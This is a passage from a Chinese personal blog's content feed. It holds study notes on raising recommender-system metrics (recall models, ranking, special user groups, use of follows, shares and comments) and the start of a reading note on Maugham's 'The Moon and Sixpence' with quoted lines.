90%是⼥性，⽤全体⽤户数据训练出的模型，对男性⽤户做的预估有偏差。</p><p>存在的问题：对于特殊⽤户，如何让排序模型预估做得准？</p><blockquote><p>方法一：结合大模型和小模型</p></blockquote><p>⽤全体⽤户⾏为训练⼤模型，⼤模型的预估 $p$ 拟合⽤户⾏为 $y$，其中 $y&#x3D;0$ 表示用户没有点击，$y&#x3D;1$ 表示用户有点击。⽤特殊⽤户的⾏为训练⼩模型，用小模型的预估 $q$ 拟合⼤模型的残差 $y-p$（表示大模型犯的错误）。对主流⽤户只⽤⼤模型做预估 $p$，对特殊用户，结合大模型和小模型的预估 $p+q$，作为最终的预估。</p><p>小模型在这里起到纠偏的作用。</p><blockquote><p>方法二：融合多个 experts，类似 MMoE</p></blockquote><p>只⽤⼀个模型，模型有多个 experts，各输出⼀个向量。对 experts 的输出做加权平均得到一个向量，和 MMoE 的区别是根据⽤户特征计算权重，而不是通过神经网络计算权重。以新⽤户为例，模型将⽤户的新⽼、活跃度等特征作为输入，输出权重，用于对 experts 做加权平均。</p><blockquote><p>方法三：大模型预估之后，用小模型做校准</p></blockquote><p>首先⽤⼤模型预估点击率、交互率，大模型可以对大部分用户做准确的预估。将⽤户特征、⼤模型预估点击率和交互率作为⼩模型（例如 GBDT）的输⼊。在特殊⽤户⼈群的数据上训练小模型，小模型的输出拟合⽤户真实行为。</p><h3 id="2-4-2-错误的做法"><a href="#2-4-2-错误的做法" class="headerlink" title="2.4.2 错误的做法"></a>2.4.2 错误的做法</h3><p>每个⽤户⼈群使⽤⼀个排序模型，推荐系统同时维护多个大模型。系统有⼀个主模型；每个⽤户⼈群有⾃⼰的⼀个模型。每天凌晨，⽤全体⽤户数据更新主模型。基于训练好的主模型，在某特殊⽤户⼈群的数据上再训练1 epoch，作为该⽤户⼈群的模型。</p><p>短期可以提升指标；维护代价⼤，长期有害。</p><p>起初，低活男性⽤户模型⽐主模型的 AUC ⾼ 0.2%。主模型迭代几个版本后，AUC 累计提升 0.5%。特殊人群模型太多，长期没有人维护和更新。如果把低活男性⽤户模型下线，换成主模型，在低活男性⽤户上的 AUC 反倒提升 0.3%！</p><p>看似指标提升了两次，但是实际上推荐系统没有任何改变，折腾之后又回到了原来的样子，只不过浪费了人的时间和机器的算力而已。</p><hr><h1 id="3-利用交互行为"><a href="#3-利用交互行为" class="headerlink" title="3 利用交互行为"></a>3 利用交互行为</h1><p>用户交互⾏为：点赞、收藏、转发、关注、评论……推荐系统如何利⽤交互⾏为？</p><p>最简单的方法：将模型预估的交互率用于排序：模型将交互行为当作预估的目标，将预估的点击率、交互率做融合，作为排序的依据。</p><p>交互行为有没有其他用途？</p><h2 id="3-1-关注量对留存的价值"><a href="#3-1-关注量对留存的价值" class="headerlink" title="3.1 关注量对留存的价值"></a>3.1 关注量对留存的价值</h2><p>对于一位用户，他关注的作者越多，则平台对他的吸引力越强。用户留存率（$r$）与他关注的作者数量（$f$）正相关，但不是线性的关系。</p><p>如果某用户的 $f$ 较小，则推荐系统要促使该用户关注更多作者。</p><p><img src="/2024/10/28/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%952/image_bsZ4qdVFi5.png"></p><p>如何利⽤关注关系提升⽤户留存？</p><ol><li><p>方法一：用排序策略提升关注量</p><p>对于用户 $u$，模型预估候选物品 $i$ 的关注率为 $p_i$。设用户 $u$ 已经关注了 $f$ 个用户，我们定义单调递减函数 $w(f)$，用户已经关注的作者越多，则 $w(f)$ 越小。</p><p>在排序融分公式中添加 $w(f) · p_i$，用于促关注，如果 $f$ 小且 $p_i$ 大，则 $w(f) · p_i$ 给物品 $i$ 带来很大加分。只有在 $f$ 小的时候才会起到作用。</p></li><li><p>方法二：构造促关注内容池和召回通道</p><p>这个内容池中物品的关注率越高，可以促关注。如果用户关注的作者数 $f$ 较小，则对该用户使用促关注内容池。召回配额可以固定，也可以与 $f$ 负相关，用户关注作者数越小，就从这个内容池召回越多的物品。</p></li></ol><h2 id="3-2-粉丝数对促发布的价值"><a href="#3-2-粉丝数对促发布的价值" class="headerlink" title="3.2 粉丝数对促发布的价值"></a>3.2 粉丝数对促发布的价值</h2><p>UGC 平台将作者发布量、发布率作为核⼼指标，希望作者多发布。作者发布的物品被平台推送给⽤户，会产⽣点赞、评论、关注等交互。交互（尤其是关注、评论）可以提升作者发布积极性。作者的粉丝数越少，则每增加⼀个粉丝对发布积极性的提升越大。</p><p>用排序策略帮助低粉新作者涨粉，某作者 $a$ 的粉丝数（被关注数）为 $f_a$，作者 $a$ 发布的物品 $i$ 可能被推荐给⽤户 $u$，模型预估关注率 $p_{ui}$。</p><p>定义单调递减函数 $\mathcal{W}(f_a)$ 作为权重，作者 $a$ 的粉丝越多，则 $\mathcal{W}(f_a)$ 越小。在排序融分公式中添加 $\mathcal{W} \left(f_{a}\right) \cdot p_{u i}$，帮助低粉作者涨粉。</p><h3 id="3-2-1-隐式关注关系"><a href="#3-2-1-隐式关注关系" class="headerlink" title="3.2.1 隐式关注关系"></a>3.2.1 隐式关注关系</h3><blockquote><p>召回通道 U2A2I：user → author → item</p></blockquote><ul><li><strong>显示关注关系</strong>：用户 $u$ 关注了作者 $a$，将 $a$ 发布的物品推荐给 $u$，此时点击率、交互率指标通常⾼于其他召回通道</li><li><strong>隐式关注关系</strong>：用户 $u$ 喜欢看作者 $a$ 发布的物品，但是 $u$ 没有关注 $a$</li></ul><p>隐式关注的作者数量远⼤于显式关注。挖掘隐式关注关系，构造 U2A2I 召回通道，可以提升推荐系统核⼼指标。</p><h2 id="3-3-转发（分享）"><a href="#3-3-转发（分享）" class="headerlink" title="3.3 转发（分享）"></a>3.3 转发（分享）</h2><h3 id="3-3-1-促转发（分享回流）"><a href="#3-3-1-促转发（分享回流）" class="headerlink" title="3.3.1 促转发（分享回流）"></a>3.3.1 促转发（分享回流）</h3><p>A 平台⽤户将物品转发到 B 平台，可以为 A 吸引站外流量，推荐系统做促转发（也叫分享回流），可以提升 DAU 和消费指标。</p><p>简单提高转发次数是否有效呢？</p><ul><li>在排序阶段，模型预估转发率为 $p$，融分公式中有一项 $w · p$，让转发率大的物品更容易获得曝光机会。</li><li>增大权重 $w$ 可以促转发，转发变多，吸引站外流量，但是会负面影响点击率和其他交互率。</li></ul><h3 id="3-3-2-KOL建模"><a href="#3-3-2-KOL建模" class="headerlink" title="3.3.2 KOL建模"></a>3.3.2 KOL建模</h3><p>⽬标：在不损害点击和其他交互的前提下，尽量多吸引站外流量。</p><p>什么样的用户的转发可以吸引大量站外流量？其他平台的Key Opinion Leader（KOL）。</p><p>如何判断本平台的用户是不是其他平台的 KOL？可以通过该用户历史上的转发能带来多少站外流量进行判断。</p><ol><li>方法一：排序融分公式中添加额外的意向 $k_{u} \cdot p_{u i}$<ul><li>$k_u$：如果用户 $u$ 是站外 KOL，则 $k_u$ 大</li><li>$p_{ui}$：为用户 $u$ 推荐物品 $i$，模型预估的转发率<br>如果 $u$ 是站外 KOL，则给他曝光他可能转发的物品。</li></ul></li><li>方法二：构造促转发的内容池和召回通道，对站外 KOL 生效</li></ol><h2 id="3-4-评论"><a href="#3-4-评论" class="headerlink" title="3.4 评论"></a>3.4 评论</h2><h3 id="3-4-1-评论促发布"><a href="#3-4-1-评论促发布" class="headerlink" title="3.4.1 评论促发布"></a>3.4.1 评论促发布</h3><p>UGC 平台将作者发布量、发布率作为核⼼指标，希望作者多发布，从而丰富物品内容池。关注、评论等交互可以提升作者发布积极性，这两个指标最重要。</p><p>对于新发布的物品，如果尚未获得很多评论，则给预估评论率提权，让物品尽快获得评论。排序融分公式中添加额外⼀项 $w_{i} \cdot p_{i}$：</p><ul><li>$w_i$：权重，与物品 $i$ 已有的评论数量负相关，获得的评论越小，越应该促评论</li><li>$p_i$：为用户推荐物品 $i$，模型预估的评论率</li></ul><h3 id="3-4-2-评论的其他价值"><a href="#3-4-2-评论的其他价值" class="headerlink" title="3.4.2 评论的其他价值"></a>3.4.2 评论的其他价值</h3><p>有的⽤户喜欢留评论，喜欢跟作者、评论区⽤户互动。给这样的⽤户添加促评论的内容池，让他们更多机会参与讨论，有利于提升这些⽤户的留存。</p><p>有的⽤户常留⾼质量评论（评论的点赞量⾼），⾼质量评论对作者、其他⽤户的留存有贡献（作者、其他用户觉得这样的评论有趣或有帮助）。推荐系统用排序和召回策略鼓励这些用户多留评论。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记11：涨指标的方法1</title>
      <link href="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/"/>
      <url>/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><h2 id="1-1-推荐系统的评价指标"><a href="#1-1-推荐系统的评价指标" class="headerlink" title="1.1 推荐系统的评价指标"></a>1.1 推荐系统的评价指标</h2><p>日活用户数（DAU）和留存是最核⼼的指标，目前工业界最常用 LT7 和 LT30 衡量留存。</p><p>假设某用户今天（$t_0$）登录 APP，未来 7 天（$t_0 \sim t_6$）中有 4 天登录 APP，那么该用户今天（$t_0$）的 LT7 等于 4。对于所有今天登录的用户，取 LT7 的平均就是整个 APP 今天的 LT7指标。LT30 的定义也是类似的，很显然有 $1 ≤ \operatorname{LT7} ≤ 7$ 和 $1 ≤ \operatorname{LT30} ≤ 30$。</p><p>像抖音小红书这样的推荐系统，算法工程师最重要的目标就是提升 LT。LT 的增长通常意味着用户体验提升（除非 LT 增长且 DAU下降）。假设 APP 禁止低活用户登录，则 DAU 下降，LT 增长。由于 LT 存在这种问题，所以如果模型或者策略的 LT 有所提升，还要看一下 DAU，要确保 DAU 不下降。</p><p>其他核⼼指标：用户使用时长、总阅读数（即总点击数）、总曝光数。这些指标的重要性低于 DAU 和留存。比如时长增长，LT 通常会增长。但是时长增长，阅读数、曝光数可能会下降。</p><p>非核⼼指标：点击率、交互率、等等。这些指标下跌也没有关系，只要核心指标上涨就行。对于 UGC 平台，物品都是普通用户创作的，UGC 平台会把发布量和发布渗透率也是核⼼指标。</p><h2 id="1-2-涨指标的方法有哪些"><a href="#1-2-涨指标的方法有哪些" class="headerlink" title="1.2 涨指标的方法有哪些"></a>1.2 涨指标的方法有哪些</h2><ol><li>改进召回模型，添加新的召回模型。</li><li>改进粗排和精排模型。</li><li>提升召回、粗排、精排中的多样性。</li><li>特殊对待新用户、低活用户等特殊⼈群。</li><li>利用关注、转发、评论这三种交互行为。</li></ol><p>前两种方法主要是模型，在之前的课程中讲的比较详细。后面三部分都是工业界的经验，参考资料较少。</p><hr><h1 id="2-召回改进"><a href="#2-召回改进" class="headerlink" title="2 召回改进"></a>2 召回改进</h1><h2 id="2-1-召回模型-召回通道"><a href="#2-1-召回模型-召回通道" class="headerlink" title="2.1 召回模型 &amp; 召回通道"></a>2.1 召回模型 &amp; 召回通道</h2><p>推荐系统有⼏⼗条召回通道，它们的召回总量是固定的。总量越大，指标越好，粗排计算量越大。</p><p>双塔模型（two-tower）和 item-to-item（I2I）是最重要的两类召回模型，占据召回的大部分配额。有很多小众的模型，占据的配额很少，但很有用。在召回总量不变的前提下，添加某些召回模型可以提升核心指标。</p><p>添加新的召回模型可以涨指标，添加内容池也可以涨指标。有很多内容池，比如 30 天物品、1 天物品、6 小时物品、新用户优质内容池、分⼈群内容池。同⼀个模型可以用于多个内容池，得到多条召回通道。例如，训练一个双塔模型可以用在多个内容池上，不会增加训练的计算量。</p><h2 id="2-2-双塔模型"><a href="#2-2-双塔模型" class="headerlink" title="2.2 双塔模型"></a>2.2 双塔模型</h2><h3 id="2-2-1-方向1：优化正负样本"><a href="#2-2-1-方向1：优化正负样本" class="headerlink" title="2.2.1 方向1：优化正负样本"></a>2.2.1 方向1：优化正负样本</h3><p>正负样本对训练双塔模型的作用非常大，是一个主要的优化点。</p><ul><li><strong>简单正样本</strong>：有点击的（用户，物品）二元组</li><li><strong>简单负样本</strong>：随机组合的（用户，物品）二元组，从全体物品库中进行随机抽样</li><li><strong>困难负样本</strong>：排序靠后的（用户，物品）二元组，在排序阶段被淘汰</li></ul><h3 id="2-2-2-方向2：改进神经网络结构"><a href="#2-2-2-方向2：改进神经网络结构" class="headerlink" title="2.2.2 方向2：改进神经网络结构"></a>2.2.2 方向2：改进神经网络结构</h3><p>Baseline：用户塔、物品塔分别是全连接⽹络，各输出⼀个向量，分别作为用户、物品的表征。改进如下：</p><ol><li>用户塔、物品塔分别用 DCN 代替全连接⽹络。</li><li>在用户塔中使用用户行为序列（last-n），可以对用户行为序列建模。</li><li>使用多向量模型代替单向量模型（标准的双塔模型也叫单向量模型）。</li></ol><p>下图所示的是多向量双塔模型：右边是物品塔，和单向量模型没有区别。物品塔只输出一个向量，作为物品的表征。左边是用户塔，输出很多向量，每个形状都和物品塔输出的向量形状相同，可以做内积或计算余弦相似度，分别作为对点击率、点赞率和完播率的预测。</p><p>如果是单向量模型相当于做二分类，只区分正负样本，但是多向量模型有点像排序中的多目标模型。</p><p><img src="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/image_m5vYKpRNmb.png"></p><h3 id="2-2-3-方向3：改进模型的训练方法"><a href="#2-2-3-方向3：改进模型的训练方法" class="headerlink" title="2.2.3 方向3：改进模型的训练方法"></a>2.2.3 方向3：改进模型的训练方法</h3><p>Baseline：做⼆分类，让模型学会区分正样本和负样本。</p><ol><li>结合⼆分类、batch 内负采样（对于 batch 内负采样，需要做纠偏）</li><li>使用⾃监督学习⽅法，让冷门物品的 Embedding 学得更好</li></ol><h2 id="2-3-Item-to-Item"><a href="#2-3-Item-to-Item" class="headerlink" title="2.3 Item-to-Item"></a>2.3 Item-to-Item</h2><p>I2I 是⼀大类模型，基于相似物品做召回。最常见的用法是 U2I2I (user → item → item)。已知用户 $u$ 喜欢物品 $i_1$（用户历史上交互过的物品），寻找 $i_1$ 的相似物品 $i_2$（即 I2I），将 $i_2$ 推荐给 $u$。</p><p>I2I 是基于相似度做召回，如何计算物品相似度？</p><ol><li><p>ItemCF 及其变体</p><p>⼀些用户同时喜欢物品 $i_1$ 和 $i_2$，则认为 $i_1$ 和 $i_2$ 相似。</p><p>ItemCF 、Online ItemCF、Swing、Online Swing 都是基于相同的思想， 线上同时使用上述 4 种 I2I 模型，各分配⼀定配额。</p></li><li><p>基于物品向量表征，计算向量相似度</p><p>双塔模型、图神经⽹络均可计算物品向量表征。</p></li></ol><h2 id="2-4-小众的召回模型"><a href="#2-4-小众的召回模型" class="headerlink" title="2.4 小众的召回模型"></a>2.4 小众的召回模型</h2><h3 id="2-4-1-类似-I2I-的模型"><a href="#2-4-1-类似-I2I-的模型" class="headerlink" title="2.4.1 类似 I2I 的模型"></a>2.4.1 类似 I2I 的模型</h3><ol><li>U2U2I（user → user → item）：已知用户 $u_1$ 与 $u_2$ 相似，且 $u_2$ 喜欢物品 $i$，那么给用户 $u_1$ 推荐物品 $i$。</li><li>U2A2I（user → author → item）：已知用户 $u$ 喜欢作者 $a$，且 $a$ 发布物品 $i$，那么给用户 $u$ 推荐物品 $i$。</li><li>U2A2A2I（user → author → author → item）：已知用户 $u$ 喜欢作者 $a_1$，且 $a_1$ 与 $a_2$ 相似，$a_2$ 发布物品 $i$，那么给用户 $u$ 推荐物品 $i$。</li></ol><h3 id="2-4-2-更复杂的模型"><a href="#2-4-2-更复杂的模型" class="headerlink" title="2.4.2 更复杂的模型"></a>2.4.2 更复杂的模型</h3><ol><li>Path-based Deep Network (PDN)</li><li>Deep Retrieval</li><li>Sparse-Interest Network (SINE)</li><li>Multi-task Multi-view Graph Representation Learning (M2GRL)</li></ol><hr><h1 id="3-排序改进"><a href="#3-排序改进" class="headerlink" title="3 排序改进"></a>3 排序改进</h1><p>通过改进粗排和精排模型，有助于提升召回、粗排和精排中的多样性。排序模型包括粗排和精排，有以下五个部分：</p><ol><li>精排模型的改进</li><li>粗排模型的改进</li><li>用户行为序列建模</li><li>在线学习</li><li>⽼汤模型</li></ol><h2 id="3-1-精排模型的改进"><a href="#3-1-精排模型的改进" class="headerlink" title="3.1 精排模型的改进"></a>3.1 精排模型的改进</h2><p>下面两个神经网络称为基座，把原始特征映射到数值向量。绿色和蓝色向量做全连接之后，同时输入到多个全连接网络，这些全连接网络通常只有两层。</p><p>精排模型的基座和上面的多目标预估都有很多可以改进的地方。</p><p><img src="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/image_kc7qKbkzRW.png"></p><h3 id="3-1-1-基座"><a href="#3-1-1-基座" class="headerlink" title="3.1.1 基座"></a>3.1.1 基座</h3><p>基座的输⼊包括离散特征和连续特征，输出⼀个向量，作为多目标预估的输⼊。</p><ol><li><strong>改进 1</strong>：基座中的全连接网络加宽加深，计算量更大，预测更准确</li><li><strong>改进 2</strong>：做⾃动的特征交叉，比如 bilinear 和 LHUC</li><li><strong>改进 3</strong>：特征工程，比如添加统计特征、多模态内容特征，需要算法工程师根据自己的经验做特征</li></ol><h3 id="3-1-2-多目标预估"><a href="#3-1-2-多目标预估" class="headerlink" title="3.1.2 多目标预估"></a>3.1.2 多目标预估</h3><p>基于基座输出的向量，同时预估点击率等多个目标。</p><ol><li><p>改进 1：增加新的预估目标，并把预估结果加⼊融合公式。</p><p>最标准的目标包括点击率、点赞率、收藏率、转发率、评论率、关注率、完播率……还可以寻找更多目标，比如进⼊评论区、给他⼈写的评论点赞……预估新的目标之后，把新的预估目标加入融合公式，排序的时候会用到这些目标。</p></li><li><p>改进 2：MMoE、PLE 等结构可能有效，但往往无效。</p></li><li><p>改进 3：纠正 position bias 可能有效，也可能无效。</p></li></ol><h2 id="3-2-粗排模型的改进"><a href="#3-2-粗排模型的改进" class="headerlink" title="3.2 粗排模型的改进"></a>3.2 粗排模型的改进</h2><p>粗排的打分量比精排大 10 倍，那么单个物品的计算量就要相应的减少 10 倍，因此粗排模型必须够快。</p><ul><li>简单模型：多向量双塔模型，同时预估点击率等多个目标。</li><li>复杂模型：三塔模型效果好，但工程实现难度较大。</li></ul><p>除了改进粗排的模型结构，通常可以采用粗精排一致性建模：蒸馏精排训练粗排，让粗排与精排更⼀致。</p><blockquote><p>方法1：pointwise 蒸馏。</p></blockquote><p>设 $y$ 是用户真实行为，设 $p$ 是精排的预估，用 $\frac{y+p}{2}$ 作为粗排拟合的目标。如果不做蒸馏，那么会直接使用 $y$ 作为拟合的目标。</p><p>例如：对于点击率目标，用户有点击（$y&#x3D;1$），精排预估 $p&#x3D;0.6$，则用 $\frac{y+p}{2}&#x3D;0.8$ 作为粗排拟合的点击率目标。</p><blockquote><p>方法2：pairwise 或 listwise 蒸馏。</p></blockquote><p>给定 $k$ 个候选物品，按照精排预估做排序。做 learning to rank（LTR）训练粗排模型，让粗排拟合物品的序（而非值）。</p><p>例如，对于物品 $i$ 和 $j$，精排预估点击率为 $p_i$ &gt; $p_j$。LTR ⿎励粗排预估点击率满⾜ $q_i$ &gt; $q_j$，否则有惩罚。LTR 通常使用 pairwise logistic loss 作为损失函数。</p><ol><li>优点：粗精排⼀致性建模可以提升核⼼指标</li><li>缺点：如果精排出bug，精排预估值 $p$ 有偏，会污染粗排训练数据</li></ol><h2 id="3-3-用户行为序列建模"><a href="#3-3-用户行为序列建模" class="headerlink" title="3.3 用户行为序列建模"></a>3.3 用户行为序列建模</h2><p>在排序模型优化到一定长度之后，涨指标会越来越难。这时候涨指标最主要的途径就是用户行为序列建模。</p><p>最简单的⽅法是对物品向量取平均，作为⼀种用户特征，表示用户曾经对什么样的物品感兴趣。DIN 使用注意力机制，对物品向量做加权平均。工业界目前沿着 SIM 的⽅向发展。先用类目等属性筛选物品，然后用 DIN 对物品向量做加权平均。</p><p><img src="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/image_XQgyGTildD.png"></p><p>接下来介绍一下改进用户行为序列建模的几个方向。</p><ol><li><strong>改进1</strong>：增加序列长度，让预测更准确，但是会增加计算成本和推理时间。增加序列长度最大的难点还是工程架构，工程架构弱的话做不到长序列。</li><li><strong>改进2</strong>：筛选的方法，比如用类目、物品向量表征聚类。</li></ol><p>具体做法如下：离线用多模态神经网络（BERT、CLIP等）提取物品内容特征，将物品表征为向量。离线将物品向量聚为 1000 类，每个物品有⼀个聚类序号，聚类通常使用层次聚类。</p><p>在线上做排序时，用户行为序列中有 $n&#x3D;1,000,000$ 个物品。某候选物品的聚类序号是 70，对 $n$ 个物品做筛选，只保留聚类序号为 70 的物品。$n$ 个物品中只有数千个被保留下来。线上同时有好几种筛选⽅法，取筛选结果的并集。</p><ol><li><strong>改进3</strong>：对用户行为序列中的物品，使用 ID 以外的⼀些特征，最简单的方法是对 ID 做 Embedding。</li></ol><p>概括：沿着 SIM 的⽅向发展，让原始的序列尽量长，然后做筛选降低序列长度，最后将筛选结果输入 DIN，对物品向量作加权平均。</p><h2 id="3-4-在线学习"><a href="#3-4-在线学习" class="headerlink" title="3.4 在线学习"></a>3.4 在线学习</h2><p><img src="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/image_C41fTulh2x.png"></p><p>需要在凌晨做全量更新，也需要全天不间断做增量更新。在完成全量更新之后，之前增量训练得到的模型可以丢弃，然后基于全量更新得到的模型继续进行增量更新。</p><p>在线学习对推荐系统的指标提升非常大，但是也会消耗更多的算力。设在线学习需要 $10,000$ CPU core 的算力增量更新⼀个精排模型，那么推荐系统⼀共需要多少额外的算力给在线学习？</p><p>如果不做 AB 测试，整个推荐系统多花 1w 个 CPU 核心就够了，但是为了做 AB 测试，线上同时运行多个不同的模型。每个模型都需要做在线学习，全天 24 小时计算梯度更新模型。如果线上有 $m$ 个模型，则需要 $m$ 套在线学习的机器。</p><p>线上有 $m$ 个模型，并非都是给测试新模型用的。$m$ 个模型中 1 个是 holdout，1 个是推全的模型，$m - 2$ 个测试的新模型。</p><p><img src="/2024/10/27/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%951/image_0C95DDZwC7.png"></p><p>每套在线学习的机器成本都很大，因此 $m$ 数量很小，制约模型开发迭代的效率。在线学习对指标的提升巨大，但是会制约模型开发迭代的效率。最好在模型相对成熟之后再考虑在线学习。</p><h2 id="3-5-老汤模型"><a href="#3-5-老汤模型" class="headerlink" title="3.5 老汤模型"></a>3.5 老汤模型</h2><p>不论做不做新模型，每天都会用新产生的数据对模型做 1 epoch 的训练。久而久之，老模型训练得非常好，很难被超过。对模型做改进，重新训练，很难追上老模型……</p><blockquote><p><strong>问题 1</strong>：如何快速判断新模型结构是否优于老模型？（不需要追上线上的老模型，只需要判断新老模型谁的结构更优）</p></blockquote><p>对于新、老模型结构，都随机初始化模型全连接层。Embedding 层可以是随机初始化，也可以是复用老模型训练好的参数。这样处理 Embedding 层，新老模型的区别就只是模型结构而已。</p><p>在做完模型初始化之后，用 $n$ 天的数据训练新老模型（从旧到新，训练 1 epoch），如果新模型显著优于老模型，新模型很可能更优。只是比较新老模型结构谁更好，而非真正追平老模型。</p><blockquote><p><strong>问题 2</strong>：如何更快追平、超过线上的老模型？（只有几十天的数据，新模型就能追上训练上百天的老模型）</p></blockquote><p>已经得出初步结论，认为新模型很可能优于老模型。用几十天的数据训练新模型，早日追平老模型。</p><ol><li><strong>方法 1</strong>：尽可能多地复用老模型训练好的 embedding 层，避免随机初始化 embedding 层（Embedding 层是对用户、物品特点的“记忆”，比全连接层学得慢）。</li><li><strong>方法 2</strong>：用老模型做 teacher，蒸馏新模型（用户真实行为是 $y$，老模型的预测是 $p$，用 $\frac{y+p}{2}$ 作为训练新模型的目标）。在训练新模型的初期做蒸馏，可以大幅加速收敛，让新模型追得更快。</li></ol><h2 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h2><p>精排模型：改进模型基座（加宽加深、特征交叉、特征工程），改进多目标预估（增加新目标、MMoE、position bias）。</p><p>粗排模型：三塔模型（取代多向量双塔模型），粗精排⼀致性建模。</p><p>用户行为序列建模：沿着 SIM 的方向迭代升级，加长序列长度，改进筛选物品的方法。</p><p>在线学习：对指标提升大，但是会降低模型迭代升级效率。</p><p>⽼汤模型制约模型迭代升级效率，需要特殊技巧。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录2：月亮与六便士</title>
      <link href="/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/"/>
      <url>/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/image_bC2RmTHbCU.png"></p><blockquote><p>《月亮和六便士》是英国小说家威廉·萨默赛特·毛姆创作的长篇小说，成书于1919年。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>在十月初的时候就读完了这本书，第一次了解到这本书是在高中，当时书店里有卖这本书，而且很火，但是自己一直没有读书的习惯，所以从来没看过。现在读完之后给我带来的感受是非常深刻的，一个人可以为自己的理想付出到什么地步，这是让我震惊的。而我的理想又是什么呢？不禁让我发问，最后看到毛姆对斯特里克兰在墙壁上作画的描写，感觉是这本书的高潮。</p><p>现在有时间写下此文，希望能一直激励我不断前进。希望我有一个自由的灵魂，随便飞到哪里都可以。&#x20;</p><hr><h1 id="2-经典语录"><a href="#2-经典语录" class="headerlink" title="2 经典语录"></a>2 经典语录</h1><ol><li>满地都是六便士，他却抬头看见了月亮。</li><li>凡是他维护体面的，都被说成虚伪；凡是他铺陈渲染的，都被当作谎言；凡是对某些事保持沉默的，干脆被斥为背叛。</li><li>为了使灵魂安宁，一个人每天至少该做两件他不喜欢的事。</li><li>我们为自己荒诞不经的行为，蒙上一层体面的缄默，并不觉得虚伪。</li><li>同情心应该像一口油井；惯爱表现同情的人却让它喷涌而出，反而让不幸的人受不了。 &#x20;</li><li>文明人践行一种奇怪的才智：他们把短暂的生命浪费在烦琐的事务上。</li><li>卑鄙与高尚，邪恶与善良，仇恨与热爱，可以并存于同一颗心灵中。</li><li>我可以告诉你，为什么他抛弃自己的妻子——纯粹是自私，再没别的。 &#x20;</li><li>我爱她，远远胜过爱我自己。要我说，爱情中如果考虑自尊，只能说明你更爱自己。</li><li>我不需要爱情。我没有时间恋爱。这是人性的弱点。我是个男人，有时候我需要女人。当我的欲望满足了，我就会去忙别的事情。真是讨厌，我无法克制自己的欲望；它囚禁着我的精神；我希望有一天，我可以不受欲望支配，自由自在地去工作。因为女人除了爱情什么也不懂，所以她们把爱情看得非常重要，简直荒谬。她们还想说服我们，让我们相信这就是生活的全部。实际上，这是微不足道的一部分。我只知道欲望。这是正常的、健康的。爱情是一种病。女人是我取乐的工具；我没耐心让她们当我的什么助手、搭档、伴侣。</li><li>一个人往往不是他想成为的那种人，而是他不得不成为的那种人。</li><li>做自己最想做的事，过自己想过的生活，心平气和，怎么能叫作践自己？做一个有名的外科医生，一年赚一万英镑，娶一位漂亮的妻子，就是成功？我想，这取决于你如何看待生活的意义……</li><li>人生永远没有太晚的时候。</li><li>人世漫长又转瞬即逝，有人见尘埃，有人见星辰，有人抬头看月亮，有人低头捡碎银。</li><li>我必须画画，我控制不了自己。如果一个人失足落水，那么他泳技好不好并不重要，反正他必须挣扎着游上岸，不然就会被淹死。</li></ol><hr><h1 id="3-关于高更"><a href="#3-关于高更" class="headerlink" title="3 关于高更"></a>3 